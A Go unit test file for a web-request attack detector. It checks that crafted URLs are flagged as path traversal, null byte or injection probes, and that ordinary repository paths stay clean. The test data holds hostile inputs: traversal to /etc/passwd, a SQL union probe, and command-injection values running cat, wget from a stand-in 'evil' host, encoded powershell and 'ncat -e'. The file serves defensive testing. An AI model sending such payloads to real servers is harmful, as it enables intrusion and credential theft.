// SPDX-License-Identifier: 0BSD
// Copyright (c) 2026 Quad4

package detect_test

import (
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/Quad4-Software/ravenguard/internal/detect"
)

func TestAttackTraversal(t *testing.T) {
	r := httptest.NewRequest(http.MethodGet, "/download?file=../../etc/passwd", nil)
	if got := detect.AttackMatch(r); got != "path_traversal" {
		t.Fatalf("got %q", got)
	}
}

func TestAttackNullByte(t *testing.T) {
	r := httptest.NewRequest(http.MethodGet, "/index.php%00.jpg", nil)
	if got := detect.AttackMatch(r); got != "null_byte" {
		t.Fatalf("got %q", got)
	}
}

func TestAttackSQLi(t *testing.T) {
	r := httptest.NewRequest(http.MethodGet, "/search?q=1'+union+select+1", nil)
	if got := detect.AttackMatch(r); got != "injection_probe" {
		t.Fatalf("got %q", got)
	}
}

func TestAttackClean(t *testing.T) {
	r := httptest.NewRequest(http.MethodGet, "/products/shoes?color=red", nil)
	if got := detect.AttackMatch(r); got != "" {
		t.Fatalf("got %q", got)
	}
}

func TestAttackDoubleEncodedTraversal(t *testing.T) {
	// %252e%252e%252f decodes to %2e%2e%2f, then to ../
	r := httptest.NewRequest(http.MethodGet, "/dl?f=%252e%252e%252f%252e%252e%252fetc%252fpasswd", nil)
	if got := detect.AttackMatch(r); got != "path_traversal" {
		t.Fatalf("double-encoded traversal must match, got %q", got)
	}
}

func TestAttackSemicolonTraversal(t *testing.T) {
	r := httptest.NewRequest(http.MethodGet, "/files/..;/etc/passwd", nil)
	if got := detect.AttackMatch(r); got != "path_traversal" {
		t.Fatalf("tomcat-style traversal must match, got %q", got)
	}
}

func TestAttackCommandInjection(t *testing.T) {
	for _, u := range []string{
		"/run?cmd=;cat%20/etc/passwd",
		"/run?cmd=|wget%20http://evil/x",
		"/run?cmd=;powershell%20-enc%20AA",
		"/run?c=||id",
		"/run?c=x%3Bncat%20-e",
	} {
		r := httptest.NewRequest(http.MethodGet, u, nil)
		if got := detect.AttackMatch(r); got != "injection_probe" {
			t.Fatalf("%s must match injection_probe, got %q", u, got)
		}
	}
}

func TestAttackNoFalsePositiveOnRepoPaths(t *testing.T) {
	// Repo browse paths can legitimately contain bin/sh and jQuery $().
	for _, u := range []string{
		"/o/r/src/branch/main/bin/sh",
		"/o/r/src/branch/main/scripts/bash/deploy.sh",
		"/search?q=$(function)&type=code",
		"/page;jsessionid=abc123",
		"/products;id=42",
	} {
		r := httptest.NewRequest(http.MethodGet, u, nil)
		if got := detect.AttackMatch(r); got != "" {
			t.Fatalf("%s must stay clean, got %q", u, got)
		}
	}
}
